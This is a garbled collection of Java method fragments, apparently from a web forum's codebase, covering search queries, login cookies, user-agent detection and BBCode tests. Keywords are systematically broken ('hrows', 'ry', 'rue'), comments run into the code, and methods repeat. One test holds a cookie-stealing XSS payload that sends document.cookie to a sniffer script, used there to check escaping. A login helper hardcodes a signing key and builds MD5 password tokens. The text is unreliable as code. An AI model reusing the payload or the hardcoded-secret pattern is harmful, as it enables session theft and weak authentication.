public String show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public static MemoriesListItem getMemoriesListItem ( Connection db , int id ) hrows SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT * FROM memories WHERE id= " + id ) ; if ( ! rs . next ( ) ) { return null ; 
public ModelAndView remove ( HttpServletRequest request , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public void checkPassword ( String password ) hrows BadPasswordException { if ( blocked ) { hrow new BadPasswordException ( nick ) ; } if ( password = = null | | ! password . equals ( his . password ) ) { hrow new BadPasswordException ( nick ) ; 
public ImmutableList < PollVariant > getPollVariants ( Connection db , int order ) hrows SQLException { List < PollVariant > variants = new ArrayList < PollVariant > ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : hrow new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return ImmutableList . copyOf ( variants ) ; } 
private ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public void performLogin ( HttpServletResponse response , Connection db , User user ) hrows SQLException { session . putValue ( " login " , Boolean . TRUE ) ; session . putValue ( " nick " , user . getNick ( ) ) ; session . putValue ( " moderator " , user . canModerate ( ) ) ; session . putValue ( " corrector " , user . canCorrect ( ) ) ; user . updateUserLastlogin ( db ) ; user . acegiSecurityHack ( response , session ) ; } 
public void updateUserLastlogin ( Connection dbconn ) hrows SQLException { String sSql = " UPDATE users SET lastlogin=CURRENT_TIMESTAMP WHERE id=? " ; PreparedStatement pst = dbconn . prepareStatement ( sSql ) ; pst . setInt ( 1 , id ) ; pst . executeUpdate ( ) ; pst . close ( ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private static boolean isAjax ( HttpServletRequest request ) { String header = request . getHeader ( " X-Requested-With " ) ; return header ! = null & & " XMLHttpRequest " . equals ( header ) ; } 
private static void performLogin ( HttpServletResponse response , Connection db , Template mpl , HttpSession session , User user ) hrows SQLException { createCookies ( response , mpl , session , user ) ; mpl . performLogin ( response , db , user ) ; } 
private static void createCookies ( HttpServletResponse response , Template mpl , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( mpl . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public View add ( ServletRequest request , @RequestParam ( " msgid " ) int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView remove ( ServletRequest request , @RequestParam ( " id " ) int id ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static String loadUserAgent ( Connection db , int id ) hrows SQLException { if ( id = = 0 ) { return null ; } PreparedStatement pst = db . prepareStatement ( " SELECT name FROM user_agents WHERE id=? " ) ; ry { pst . setInt ( 1 , id ) ; 
private static ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( editInfoList ! = null ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public Message getNextMessage ( Connection db , SectionStore sectionStore ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db , SectionStore sectionStore ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public ModelAndView mainPage ( HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
private static int fixOffset ( Integer offset ) { if ( offset ! = null ) { if ( offset < 0 ) { 
public Section getSection ( int id ) hrows SectionNotFoundException { Section section = sections . get ( id ) ; if ( section = = null ) { hrow new SectionNotFoundException ( id ) ; } return section ; } 
private static PreparedStatement prepare ( Connection db ) hrows SQLException { return db . prepareStatement ( " SELECT message, bbcode FROM msgbase WHERE id=? " ) ; } 
private static String getProcessedMessage ( Connection db , PreparedStatement pst , Comment comment ) hrows SQLException { pst . setInt ( 1 , comment . getId ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; rs . next ( ) ; String ext = rs . getString ( 1 ) ; boolean bbcode = rs . getBoolean ( 2 ) ; rs . close ( ) ; if ( bbcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public static PreparedComment prepare ( Connection db , CommentList comments , Comment comment ) hrows UserNotFoundException , SQLException { PreparedStatement pst = prepare ( db ) ; ry { return new PreparedComment ( db , pst , comments , comment ) ; 
public static List < PreparedComment > prepare ( Connection db , CommentList comments , List < Comment > list ) hrows UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; PreparedStatement pst = prepare ( db ) ; ry { for ( Comment comment : list ) { 
public List < EditInfoDTO > loadEditInfo ( Connection db ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " ) ; ry { pst . setInt ( 1 , msgid ) ; 
public static boolean isBox ( String name ) { return BOX_SET . contains ( name ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( " newfirst " , Boolean . FALSE ) ; defaults . put ( " hover " , Boolean . TRUE ) ; defaults . put ( " style " , " black " ) ; defaults . put ( " format.mode " , " quot " ) ; defaults . put ( " opics " , 30 ) ; defaults . put ( " messages " , 50 ) ; defaults . put ( " ags " , 50 ) ; defaults . put ( " photos " , Boolean . TRUE ) ; defaults . put ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; defaults . put ( " showinfo " , Boolean . TRUE ) ; defaults . put ( " showanonymous " , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( " avatar " , " empty " ) ; defaults . put ( HIDE_ADSENSE , rue ) ; defaults . put ( MAIN_GALLERY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put("main.3columns", Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put("main2", boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put("main3-1", boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put("main3-2", boxes32); return defaults; } 
public static boolean isStyle ( String style ) { return STYLE_SET . contains ( style ) ; } 
public void estDefaultProfile ( ) { Profile profile = new Profile ( ) ; assertTrue ( profile . isDefault ( ) ) ; } 
public void estDefaultProfileSave ( ) hrows Exception { Profile profile = new Profile ( ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) ) ; assertFalse ( profile1 . isDefault ( ) ) ; } 
public void estModification ( ) hrows Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getHashtable ( ) . getInt ( " messages " ) ) ; profile . getHashtable ( ) . setInt ( " messages " , 125 ) ; ByteArrayOutputStream os = new ByteArrayOutputStream ( ) ; profile . write ( os ) ; Profile profile1 = new Profile ( new ByteArrayInputStream ( os . oByteArray ( ) ) ) ; assertEquals ( 125 , profile1 . getHashtable ( ) . getInt ( " messages " ) ) ; } 
public void performLogin ( HttpServletResponse response , Connection db , User user ) hrows SQLException { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . canModerate ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; user . updateUserLastlogin ( db ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
private Profile readProfile ( ) hrows ClassNotFoundException , IOException , StorageException { InputStream df = null ; ry { df = config . getStorage ( ) . getReadStream ( " profile " , getNick ( ) ) ; 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( Boolean ) session . getAttribute ( " moderator " ) ; } 
public boolean isCorrectorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return session . getAttribute ( " corrector " ) ! = null ? ( Boolean ) session . getAttribute ( " corrector " ) : false ; } 
public boolean isMobile ( ) { if ( ! " ango " . equals ( style ) ) { return false ; } return userAgent . detectAndroidWebKit ( ) ; } 
public ModelAndView view ( HttpServletRequest request ) hrows UtilException { boolean isThreeColumn = getThreeColumns ( request ) ; ModelAndView result = new ModelAndView ( " edit-boxes " ) ; result . addObject ( " isThreeColumn " , isThreeColumn ) ; return result ; } 
protected static boolean getThreeColumns ( HttpServletRequest request ) hrows UtilException { Template = Template . getTemplate ( request ) ; return . getProf ( ) . getBoolean ( " main.3columns " ) ; } 
public boolean detectIphone ( ) { The iPod touch says it's an iPhone! So let's disambiguate. if (userAgent.contains(deviceIphone) && !detectIpod()) { return true; } return false; } 
public boolean detectIpod ( ) { if ( userAgent . contains ( deviceIpod ) ) { return rue ; } return false ; } 
public boolean detectIphoneOrIpod ( ) { We repeat the searches here because some iPods may report themselves as an iPhone, which would be okay. if (userAgent.contains(deviceIphone) || userAgent.contains(deviceIpod)) { return true; } return false; } 
public boolean detectAndroid ( ) { if ( userAgent . contains ( deviceAndroid ) ) { return rue ; } return false ; } 
public boolean detectWebkit ( ) { if ( userAgent . contains ( engineWebKit ) ) { return rue ; } return false ; } 
public boolean detectS60OssBrowser ( ) { First, test for WebKit, then make sure it's either Symbian or S60. if (detectWebkit() && (userAgent.contains(deviceSymbian) || userAgent.contains(deviceS60))) { return true; } return false; } 
public boolean detectSymbianOS ( ) { if ( userAgent . contains ( deviceSymbian ) | | userAgent . contains ( deviceS60 ) | | userAgent . contains ( deviceS70 ) | | userAgent . contains ( deviceS80 ) | | userAgent . contains ( deviceS90 ) ) { return rue ; } return false ; } 
public boolean detectWindowsMobile ( ) { Most devices use 'Windows CE', but some report 'iemobile' and some older ones report as 'PIE' for Pocket IE. if (userAgent.contains(deviceWinMob) || userAgent.contains(deviceIeMob) || userAgent.contains(enginePie) || (detectWapWml() && userAgent.contains(deviceWindows))) { return true; } return false; } 
public boolean detectBlackBerry ( ) { if ( userAgent . contains ( deviceBB ) | | httpAccept . contains ( vndRIM ) ) { return rue ; } return false ; } 
public boolean detectPalmOS ( ) { Most devices nowadays report as 'Palm', but some older ones reported as Blazer or Xiino. if (userAgent.indexOf(devicePalm) != -1 || userAgent.contains(engineBlazer) || userAgent.contains(engineXiino)) { return true; } return false; } 
public boolean detectBrewDevice ( ) { if ( userAgent . contains ( deviceBrew ) ) { return rue ; } return false ; } 
public boolean detectDangerHiptop ( ) { if ( userAgent . contains ( deviceDanger ) | | userAgent . contains ( deviceHiptop ) ) { return rue ; } return false ; } 
public boolean detectOperaMobile ( ) { if ( userAgent . contains ( engineOpera ) & & ( userAgent . contains ( mini ) | | userAgent . contains ( mobi ) ) ) { return rue ; } return false ; } 
public boolean detectWapWml ( ) { if ( httpAccept . indexOf ( vndwap ) ! = - 1 | | httpAccept . contains ( wml ) ) { return rue ; } return false ; } 
public boolean detectMobileQuick ( ) { Ordered roughly by market share, WAP/XML > Brew > Smartphone. if (detectWapWml()) { return true; } if (detectBrewDevice()) { return true; } Updated by AHand if (detectOperaMobile()) { return true; } if (userAgent.contains(engineUpBrowser)) { return true; } if (userAgent.contains(engineOpenWeb)) { return true; } if (userAgent.contains(deviceMidp)) { return true; } if (detectSmartphone()) { return true; } if (detectDangerHiptop()) { return true; } if (detectMidpCapable()) { return true; } if (userAgent.contains(devicePda)) { return true; } if (userAgent.contains(mobile)) { return true; } detect older phones from certain manufacturers and operators. if (userAgent.contains(uplink)) { return true; } if (userAgent.contains(manuSonyEricsson)) { return true; } if (userAgent.contains(manuericsson)) { return true; } if (userAgent.contains(manuSamsung1)) { return true; } if (userAgent.contains(svcDocomo)) { return true; } if (userAgent.contains(svcKddi)) { return true; } if (userAgent.contains(svcVodafone)) { return true; } return false; } 
public boolean detectSonyPlaystation ( ) { if ( userAgent . contains ( devicePlaystation ) ) { return rue ; } return false ; } 
public boolean detectNintendo ( ) { if ( userAgent . contains ( deviceNintendo ) | | userAgent . contains ( deviceWii ) | | userAgent . contains ( deviceNintendoDs ) ) { return rue ; } return false ; } 
public boolean detectXbox ( ) { if ( userAgent . contains ( deviceXbox ) ) { return rue ; } return false ; } 
public boolean detectMidpCapable ( ) { if ( userAgent . contains ( deviceMidp ) | | httpAccept . contains ( deviceMidp ) ) { return rue ; } return false ; } 
public boolean detectMaemoTablet ( ) { if ( userAgent . contains ( maemo ) ) { return rue ; } else if ( userAgent . contains ( maemoTablet ) & & userAgent . contains ( linux ) ) { return rue ; } return false ; } 
public boolean detectArchos ( ) { if ( userAgent . contains ( deviceArchos ) ) { return rue ; } return false ; } 
public boolean detectSonyMylo ( ) { if ( userAgent . contains ( manuSony ) & & ( userAgent . contains ( qtembedded ) | | userAgent . contains ( mylocom2 ) ) ) { return rue ; } return false ; } 
public void estLineBreak ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LINE_BREAK_TEST ) ; assertEquals ( LINE_BREAK_RESULT , result ) ; } 
public void estTagExcape ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , TAG_ESCAPE_TEST ) ; assertEquals ( TAG_ESCAPE_RESULT , result ) ; } 
public void estJavascriptURL ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , JAVASCRIPT_URL ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s> " , result ) ; } 
public void estCodeExcape ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div><p> " , result ) ; } 
public void estList ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LIST_TEST ) ; assertEquals ( LIST_RESULT , result ) ; } 
public void estBadList ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , BADLIST_TEST ) ; assertEquals ( BADLIST_RESULT , result ) ; } 
public void estUnexceptedCut ( ) hrows Exception { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( rue ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul><p> " , result ) ; } 
private static ModelAndView prepareModel ( Connection db , Message message ) hrows SQLException , BadGroupException , UserNotFoundException , PollNotFoundException { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " message " , message ) ; PreparedMessage preparedMessage = new PreparedMessage ( db , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public void initCurrentUser ( Connection db ) hrows SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null ) { return ; } ry { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public void initCurrentUser ( Connection db ) hrows SQLException { initCurrentUser ( db , false ) ; } 
public void updateCurrentUser ( Connection db ) hrows SQLException { initCurrentUser ( db , rue ) ; } 
private void initCurrentUser ( Connection db , boolean forceUpdate ) hrows SQLException { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } ry { currentUser = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; 
public void resetUnreadEvents ( Connection db ) hrows SQLException { PreparedStatement st = db . prepareStatement ( " UPDATE users SET unread_events=0 where id=? " ) ; ry { st . setInt ( 1 , id ) ; 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { ime = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public List < SearchItem > show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 | | ( userTopic & & username . length ( ) > 0 ) ) { select . append ( " , topics " ) ; } if ( section ! = 0 ) { select . append ( " , groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND not msgs.deleted AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgbase_postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; if ( userTopic ) { select . append ( " AND topics.userid= " ) . append ( user . getId ( ) ) ; select . append ( " AND topics.id = topic " ) ; } else { select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; SearchCacher cacher = new SearchCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " ime " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { ime = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; ime = System . currentTimeMillis ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = System . currentTimeMillis ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public void estCodeBR ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [code]test ntest[/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" no-highlight \" ><code>test ntest</code></pre></div><p> " , result ) ; } 
